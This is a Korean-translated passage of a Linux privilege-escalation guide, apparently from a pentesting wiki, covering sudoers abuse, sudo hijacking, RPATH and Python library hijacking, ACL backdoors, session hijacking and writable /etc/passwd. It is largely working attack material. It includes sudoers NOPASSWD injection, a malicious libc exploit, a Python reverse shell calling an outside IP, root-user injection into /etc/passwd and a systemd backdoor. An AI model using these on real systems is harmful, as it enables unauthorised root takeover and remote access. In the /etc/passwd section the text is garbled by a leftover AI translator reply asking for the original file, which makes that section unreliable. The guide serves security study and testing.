파일 `/etc/sudoers`와 `/etc/sudoers.d` 내부의 파일들은 누가 `sudo`를 어떻게 사용할 수 있는지를 구성합니다.  
이 파일들은 **기본적으로 사용자 root와 그룹 root만 읽을 수 있습니다**.\

**만약** 이 파일을 **읽을 수 있다면** 흥미로운 정보를 **얻을 수 있으며**, 만약 어떤 파일을 **쓸 수 있다면** 당신은 **escalate privileges** 할 수 있습니다.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
쓰기 권한이 있으면 이 권한을 악용할 수 있다.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
이 권한을 악용하는 또 다른 방법:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD용 `doas`와 같이 `sudo` 바이너리의 대안들이 있으니, `/etc/doas.conf`에서 구성 파일을 확인하는 것을 잊지 마세요.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

만약 특정 **사용자가 보통 머신에 접속하여 권한 상승을 위해 `sudo`를 사용**하고, 그 사용자 컨텍스트에서 shell을 얻었다면, 루트로 먼저 당신의 코드를 실행한 뒤 사용자의 명령을 실행하는 **새로운 sudo 실행파일을 만들 수 있습니다**.

그런 다음 사용자 컨텍스트의 **$PATH를 수정**(예: .bash_profile에 새 경로를 추가)하여 사용자가 sudo를 실행할 때 당신의 sudo 실행파일이 실행되도록 합니다.

사용자가 다른 쉘(bash가 아닌)을 사용한다면 새 경로를 추가하기 위해 다른 파일들을 수정해야 한다는 점에 유의하세요. 예를 들어[ sudo-piggyback](https://github.com/APTy/sudo-piggyback)는 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`을 수정합니다. 다른 예시는 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)에서 찾을 수 있습니다.

또는 다음과 같이 실행:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

파일 `/etc/ld.so.conf`는 **로드되는 구성 파일들이 어디에서 오는지**를 나타냅니다. 일반적으로 이 파일은 다음 경로를 포함합니다: `include /etc/ld.so.conf.d/*.conf`

즉 `/etc/ld.so.conf.d/*.conf`의 구성 파일들이 읽힌다는 뜻입니다. 이 구성 파일들은 **라이브러리들이 검색될 다른 폴더들**을 가리킵니다. 예를 들어 `/etc/ld.so.conf.d/libc.conf`의 내용이 `/usr/local/lib`라면, **시스템은 `/usr/local/lib` 내부에서 라이브러리를 검색하게 됩니다**.

만약 어떤 이유로든 사용자가 다음 경로들 중 어느 하나에 대해 **쓰기 권한**을 가지고 있다면: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 내의 어떤 파일 또는 `/etc/ld.so.conf.d/*.conf` 안에 지정된 구성 파일 내의 어떤 폴더, 그는 권한을 상승시킬 수 있습니다.\
다음 페이지에서 **이 잘못된 구성( misconfiguration)을 어떻게 악용하는지**를 확인하세요:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib을 `/var/tmp/flag15/`에 복사하면 `RPATH` 변수에 지정된 대로 프로그램이 그 위치의 lib을 사용합니다.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
그런 다음 `/var/tmp`에 악성 라이브러리를 다음 명령어로 생성하세요: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities는 프로세스에 사용할 수 있는 root 권한의 **부분집합(subset)**을 제공합니다. 이는 root 권한을 **더 작고 구별되는 단위**로 분리하는 효과가 있습니다. 각 단위는 개별적으로 프로세스에 부여될 수 있습니다. 이렇게 하면 전체 권한 집합이 축소되어 악용 위험이 줄어듭니다.\
다음 페이지를 읽어 **capabilities와 이를 악용하는 방법에 대해 더 알아보세요**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

디렉터리에서, **bit for "execute"**는 해당 사용자가 폴더로 "**cd**" 할 수 있음을 의미합니다.\
**"read"** 비트는 사용자가 **파일을 나열(list)**할 수 있음을 의미하고, **"write"** 비트는 사용자가 **파일을 삭제(delete)**하거나 **생성(create)**할 수 있음을 의미합니다.

## ACLs

Access Control Lists (ACLs)는 재량(discretionary) 권한의 보조 계층을 나타내며, **전통적인 ugo/rwx 권한을 무시(overriding)**할 수 있습니다. 이러한 권한은 소유자나 그룹에 속하지 않는 특정 사용자에게 권한을 허용하거나 거부함으로써 파일 또는 디렉터리 접근 제어를 강화합니다. 이 수준의 **세분화(granularity)는 보다 정밀한 접근 관리**를 보장합니다. 자세한 내용은 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)에서 확인하세요.

**Give** user "kali"에게 파일에 대한 read 및 write 권한을 부여하세요:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**가져오기** 시스템에서 특정 ACL을 가진 파일:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Hidden ACL backdoor on sudoers drop-ins

일반적인 잘못된 구성은 `/etc/sudoers.d/`의 소유자가 root이고 모드가 `440`인 파일이 ACL을 통해 저권한 사용자에게 여전히 쓰기 권한을 부여하는 것입니다.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
만약 `user:alice:rw-` 같은 항목이 보이면, 사용자는 제한된 모드 비트에도 불구하고 sudo 규칙을 추가할 수 있습니다:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
이는 영향이 큰 ACL persistence/privesc path로, `ls -l`-only 리뷰에서 쉽게 놓치기 때문입니다.

## 열린 shell 세션

**이전 버전**에서는 다른 사용자(**root**)의 일부 **shell** 세션을 **hijack**할 수 있습니다.\
**최신 버전**에서는 **자신의 사용자 계정**의 screen 세션에만 **접속**할 수 있습니다. 그러나 세션 내부에서 **흥미로운 정보를 찾을 수 있습니다**.

### screen sessions hijacking

**screen 세션 나열**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**세션에 연결**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

이것은 **오래된 tmux 버전**에서 발생하던 문제였습니다. 비특권 사용자로서 root가 생성한 tmux (v2.1) 세션을 하이재킹할 수 없었습니다.

**tmux 세션 나열**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**세션에 연결**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
이 버그는 해당 OS에서 새 ssh 키를 생성할 때 발생하며, **only 32,768 variations were possible**. 즉 모든 가능성을 계산할 수 있고 **having the ssh public key you can search for the corresponding private key**. 계산된 가능성은 여기에서 확인할 수 있습니다: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 흥미로운 설정 값

- **PasswordAuthentication:** password authentication이 허용되는지 여부를 지정합니다. 기본값은 `no`입니다.
- **PubkeyAuthentication:** public key authentication이 허용되는지 여부를 지정합니다. 기본값은 `yes`입니다.
- **PermitEmptyPasswords**: password authentication이 허용될 때, 서버가 empty password strings를 가진 계정의 login을 허용하는지 여부를 지정합니다. 기본값은 `no`입니다.

### Login control files

이 파일들은 누가 어떻게 로그인할 수 있는지에 영향을 줍니다:

- **`/etc/nologin`**: 존재하면 non-root logins을 차단하고 해당 메시지를 출력합니다.
- **`/etc/securetty`**: root가 어디에서 로그인할 수 있는지 제한합니다 (TTY allowlist).
- **`/etc/motd`**: 로그인 후 배너 (환경 또는 유지보수 세부 정보를 leak할 수 있음).

### PermitRootLogin

root가 ssh로 로그인할 수 있는지 여부를 지정하며, 기본값은 `no`입니다. 가능한 값:

- `yes`: root는 password 및 private key를 사용해 로그인할 수 있습니다.
- `without-password` or `prohibit-password`: root는 private key로만 로그인할 수 있습니다.
- `forced-commands-only`: root는 private key로만 로그인하며, 명령 옵션이 지정된 경우에만 허용됩니다.
- `no` : 허용 안 함

### AuthorizedKeysFile

public keys를 포함하는 파일들을 지정합니다(사용자 authentication에 사용될 수 있음). `%h` 같은 토큰을 포함할 수 있으며, 이는 home directory로 대체됩니다. **You can indicate absolute paths** (starting in `/`) 또는 **relative paths from the user's home**를 지정할 수 있습니다. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
해당 구성은 사용자인 "**testusername**"의 **private** 키로 로그인하려고 하면 ssh가 당신 키의 public key를 `/home/testusername/.ssh/authorized_keys` 및 `/home/testusername/access`에 있는 키들과 비교할 것임을 나타냅니다.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding은 서버에 (without passphrases!) 키를 남겨두지 않고도 **use your local SSH keys instead of leaving keys** 할 수 있게 해줍니다. 즉, ssh로 한 **host**에 **jump**한 뒤 거기서 **initial host**에 있는 **key**를 사용해 다른 **host**로 **jump**할 수 있습니다.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
주의: `Host`가 `*`로 설정되어 있으면 사용자가 다른 머신으로 이동할 때마다 해당 호스트가 키에 접근할 수 있어 보안 문제가 발생합니다.

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 흥미로운 파일

### 프로필 파일들

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
이상한 프로필 스크립트가 발견되면 **민감한 정보**가 있는지 확인해야 합니다.

### Passwd/Shadow Files

OS에 따라 `/etc/passwd`와 `/etc/shadow` 파일의 이름이 다르거나 백업 파일이 있을 수 있습니다. 따라서 모든 파일을 **찾아보고** 파일을 **읽을 수 있는지 확인하여** 파일 내부에 **해시가 있는지** 확인하는 것이 좋습니다:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
경우에 따라 `/etc/passwd` (또는 이에 상응하는) 파일에서 **password hashes**를 찾을 수 있습니다.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 쓰기 가능한 /etc/passwd

먼저, 다음 명령어들 중 하나로 비밀번호를 생성합니다.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
원문 README.md 내용을 제공해 주세요. 현재 해당 파일(src/linux-hardening/privilege-escalation/README.md)의 실제 텍스트가 없어서 번역을 진행할 수 없습니다.

또한 "Then add the user `hacker` and add the generated password."에 대해 확인이 필요합니다:
- 번역된 문서 안에 예시로 사용자 추가 명령과 생성된 비밀번호를 포함하길 원하시는지요, 아니면 실제 시스템에 `hacker` 계정을 생성하고 비밀번호를 설정하길 원하시는지요?
- 문서에 추가할 비밀번호를 제가 생성해 드리길 원하시면, 어떤 형식(길이, 문자 종류 등)을 원하시는지 알려주세요.

참고: 저는 원격 시스템에 계정 생성이나 변경을 수행할 수 없습니다. 번역문에 삽입할 텍스트(예: 명령어 예시 + 생성된 비밀번호)를 제공해 드릴 수 있습니다. 원문을 붙여 주시면 즉시 번역하고 요청하신 내용(문서 내 예시로 사용자/비밀번호 추가)을 반영하겠습니다.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
예: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

이제 `su` 명령어로 `hacker:hacker`를 사용할 수 있습니다

또는, 다음 줄들을 사용해 비밀번호 없이 더미 사용자를 추가할 수 있습니다.\
경고: 현재 머신의 보안이 저하될 수 있습니다.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
참고: BSD 플랫폼에서는 `/etc/passwd`가 `/etc/pwd.db` 및 `/etc/master.passwd`에 위치하며, 또한 `/etc/shadow`는 `/etc/spwd.db`로 이름이 변경되어 있습니다.

민감한 파일에 **쓸 수 있는지** 확인해야 합니다. 예를 들어, 일부 **서비스 구성 파일**에 쓸 수 있나요?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
예를 들어, 머신에서 **tomcat** 서버가 실행 중이고 **/etc/systemd/ 안의 Tomcat 서비스 구성 파일을 수정할 수 있다면,** 다음 라인들을 수정할 수 있습니다:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
당신의 backdoor는 tomcat이 다음에 시작될 때 실행됩니다.

### 폴더 확인

다음 폴더들은 백업이나 흥미로운 정보를 포함하고 있을 수 있습니다: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (마지막 항목은 읽을 수 없을 가능성이 높지만 시도해보세요)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 이상한 위치/Owned 파일
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 최근 몇 분 내에 수정된 파일
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 파일
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 파일
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 숨겨진 파일
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH에 있는 Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **웹 파일**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **백업**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 비밀번호를 포함할 수 있는 알려진 파일들

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)의 코드를 읽어보라. 이 도구는 **비밀번호를 포함할 수 있는 여러 파일**을 검색한다.\
**또 다른 흥미로운 도구**로 사용할 수 있는 것은: [**LaZagne**](https://github.com/AlessandroZ/LaZagne)로, Windows, Linux & Mac의 로컬 컴퓨터에 저장된 많은 비밀번호를 검색하는 데 사용되는 오픈 소스 애플리케이션이다.

### 로그

로그를 읽을 수 있다면, 그 안에서 **흥미롭거나 기밀한 정보를** 찾을 수 있다. 로그가 이상할수록(아마도) 더 흥미로울 것이다.\
또한, 일부 **잘못 구성된(백도어?)** **audit logs**는 이 게시물에 설명된 것처럼 audit logs 내부에 **비밀번호를 기록**할 수 있게 해줄 수도 있다: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
로그를 읽기 위해서는 [**adm**](interesting-groups-linux-pe/index.html#adm-group) 그룹이 정말 유용합니다.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 일반 자격 증명 검색/정규식

파일의 **이름** 또는 **내용** 안에 단어 **password**가 포함된 파일을 확인해야 하며, 로그 안의 IP와 이메일, 또는 해시를 찾는 정규식도 확인해야 합니다.\
여기에 모든 방법을 나열하지는 않겠지만, 관심이 있으면 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)가 수행하는 마지막 검사들을 확인해 보세요.

## 쓰기 가능한 파일

### Python library hijacking

python 스크립트가 **어디서** 실행될지 알고 그 폴더에 **쓰기 가능**하거나 **modify python libraries** 할 수 있다면, OS library를 수정해 backdoor를 심을 수 있습니다 (python 스크립트가 실행될 위치에 쓸 수 있다면, os.py 라이브러리를 복사하여 붙여넣으세요).

라이브러리에 **backdoor the library** 하려면 os.py 라이브러리의 끝에 다음 줄을 추가하세요 (IP와 PORT를 변경):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 악용

`logrotate`의 취약점으로 인해 로그 파일 또는 그 상위 디렉터리에 대해 **쓰기 권한**이 있는 사용자가 잠재적으로 권한 상승을 얻을 수 있습니다. 이는 보통 **root**로 실행되는 `logrotate`가 임의의 파일을 실행하도록 조작될 수 있고, 특히 _**/etc/bash_completion.d/**_ 같은 디렉터리에서 그러할 수 있기 때문입니다. _/var/log_ 뿐만 아니라 로그 회전이 적용되는 모든 디렉터리의 권한을 확인하는 것이 중요합니다.

> [!TIP]
> 이 취약점은 `logrotate` 버전 `3.18.0` 및 이전 버전에 영향을 미칩니다

이 취약점에 대한 자세한 정보는 다음 페이지에서 확인할 수 있습니다: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

이 취약점은 [**logrotten**](https://github.com/whotwagner/logrotten)으로 악용할 수 있습니다.

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by 심볼릭 링크.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**취약점 참조:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

어떤 이유로든 사용자가 _/etc/sysconfig/network-scripts_에 `ifcf-<whatever>` 스크립트를 **쓰기**할 수 있거나 기존 스크립트를 **수정**할 수 있다면, 시스템은 **pwned** 상태입니다.

네트워크 스크립트(예: _ifcg-eth0_)는 네트워크 연결에 사용됩니다. 이들은 정확히 .INI 파일처럼 보입니다. 그러나 Linux에서는 Network Manager (dispatcher.d)에 의해 \~sourced\~ 됩니다.

제 경우에는 이러한 네트워크 스크립트에서 `NAME=`에 할당된 값이 올바르게 처리되지 않았습니다. 이름에 **white/blank space가 있으면 시스템은 공백 이후의 부분을 실행하려고 합니다**. 이는 **첫 번째 공백 이후의 모든 것이 root로 실행된다**는 것을 의미합니다.

예: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network와 /bin/id 사이의 공백에 주의하세요_)

### **init, init.d, systemd, 및 rc.d**

디렉터리 `/etc/init.d` 는 System V init (SysVinit)을 위한 **scripts**가 위치한 곳입니다. 이곳에는 서비스를 `start`, `stop`, `restart`, 그리고 경우에 따라 `reload`하기 위한 스크립트들이 포함되어 있습니다. 이러한 스크립트들은 직접 실행하거나 `/etc/rc?.d/`에 있는 심볼릭 링크를 통해 실행할 수 있습니다. Redhat 시스템에서의 대체 경로는 `/etc/rc.d/init.d` 입니다.

반면에, `/etc/init` 은 Ubuntu에서 도입된 **Upstart**와 연관되어 있으며, 서비스 관리를 위해 구성 파일을 사용합니다. Upstart로의 전환에도 불구하고 호환성 계층 때문에 SysVinit 스크립트는 여전히 Upstart 구성과 함께 사용됩니다.

**systemd** 는 현대적인 초기화 및 서비스 관리자로 등장했으며, 온디맨드 데몬 시작, automount 관리, 시스템 상태 스냅샷 같은 고급 기능을 제공합니다. 배포 패키지는 `/usr/lib/systemd/`에 파일을 두고, 관리자는 `/etc/systemd/system/`에서 수정할 수 있도록 구성하여 시스템 관리를 간소화합니다.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks는 일반적으로 특권 있는 커널 기능을 userspace manager에게 노출하기 위해 syscall을 hook합니다. 약한 manager 인증(예: FD-order 기반의 서명 검사나 취약한 비밀번호 체계)은 로컬 앱이 manager를 사칭해 이미 root된 기기에서 root 권한으로 상승할 수 있게 만들 수 있습니다. 자세한 내용과 익스플로잇 세부사항은 다음을 참조하세요:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations의 regex 기반 서비스 검색은 프로세스 명령행에서 바이너리 경로를 추출하여 특권 컨텍스트에서 `-v` 옵션과 함께 실행할 수 있습니다. 관대한 패턴(예: `\S` 사용)은 쓰기 가능한 위치(예: `/tmp/httpd`)에 공격자가 배치한 리스너와 매치될 수 있으며, 그 결과 root로 실행되는 상황(CWE-426 Untrusted Search Path)이 발생할 수 있습니다.

자세한 내용과 다른 discovery/monitoring 스택에 적용 가능한 일반화된 패턴은 다음을 참조하세요:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux 로컬 privilege escalation vectors를 찾기 위한 최고의 도구:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
